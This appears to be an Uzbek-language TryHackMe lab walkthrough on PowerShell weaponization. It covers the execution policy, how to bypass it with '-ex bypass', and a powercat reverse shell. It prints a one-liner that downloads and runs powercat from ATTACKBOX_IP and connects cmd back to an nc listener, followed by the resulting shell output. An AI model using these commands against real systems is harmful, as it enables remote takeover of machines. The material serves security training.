

**PowerShell** — bu ba’zi eski (legacy) foydalanish holatlari istisno bo‘lsa-da, .NET dagi **Dynamic Language Runtime (DLR)** orqali ishlaydigan ob’yektga yo‘naltirilgan dasturlash tili. PowerShell haqida ko‘proq bilish uchun **TryHackMe**’dagi *Hacking with PowerShell* xonasini ko‘ring.

**Red teamer**lar PowerShell’dan dastlabki kirish, tizimni aniqlash (enumeration) va boshqa ko‘plab faoliyatlarda foydalanadilar. Keling, oddiy PowerShell skriptini yaratishdan boshlaymiz. Bu skript quyidagi xabarni chiqaradi:

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Faylni **thm.ps1** nomi bilan saqlang. `Write-Output` yordamida biz `"Welcome to the Weaponization Room!"` xabarini konsolga chiqaramiz. Endi uni ishga tushiramiz:

**CMD:**

```
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

---

### **Execution Policy**

**PowerShell**’ning **execution policy** parametri tizimni zararli skriptlarni ishga tushirishdan himoya qilish uchun mo‘ljallangan. Standart holatda `.ps1` PowerShell skriptlarini ishga tushirish Microsoft tomonidan **o‘chirib qo‘yilgan** bo‘ladi.

**Restricted** rejimida faqat yakka buyruqlar bajariladi, lekin skriptlarni ishlatish mumkin emas.

Joriy **PowerShell** sozlamasini tekshirish uchun:

**CMD:**

```
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

Bu parametrni osonlikcha o‘zgartirish mumkin. Masalan:

**CMD:**

```
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

**Execution Policy Change xabari:**

```
The execution policy helps protect you from scripts that you do not trust...
[Y] Yes [A] Yes to All [N] No ...
```

`A` tugmasini bosamiz.

---

### **Bypass Execution Policy**

Microsoft bu cheklovni vaqtincha aylanib o‘tish imkoniyatini ham beradi. Masalan, `powershell` buyrug‘iga maxsus argument berib, uni **bypass** rejimiga o‘tkazish mumkin. Bu rejimda hech narsa bloklanmaydi yoki cheklanmaydi.

Bu foydali, chunki o‘zimiz yaratgan PowerShell skriptlarini hech qanday to‘siqsiz ishga tushirish imkonini beradi.

**CMD:**

```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

---

### **Reverse Shell olish (Powercat bilan)**

Endi PowerShell’da yozilgan **powercat** vositasidan foydalanib reverse shell olishga harakat qilamiz.

Buning uchun **AttackBox**’ingizda quyidagilarni bajaring:

**Terminal:**

```bash
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
```

Bu 8080-portda web-server ishga tushiradi.

Keyin **AttackBox**’da **nc** yordamida 1337-portda tinglashni boshlaymiz:

```bash
nc -lvp 1337
```

---

**Jabrlanuvchi (victim) mashinasida** quyidagilarni bajarib, `powercat.ps1` faylini yuklab olish va ishga tushirish mumkin:

**CMD:**

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Bu buyruq quyidagilarni qiladi:

1. `powercat.ps1` faylini web-serveringizdan yuklab oladi.
2. Uni lokal ravishda ishga tushiradi.
3. `cmd.exe` orqali interaktiv shell ochadi va 1337-portga ulanish yuboradi.

---

**AttackBox**’da **nc** oynasida quyidagini ko‘ramiz:

```
listening on [any] 1337 ...
connect to [10.8.232.37] from [10.10.12.53] ...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```
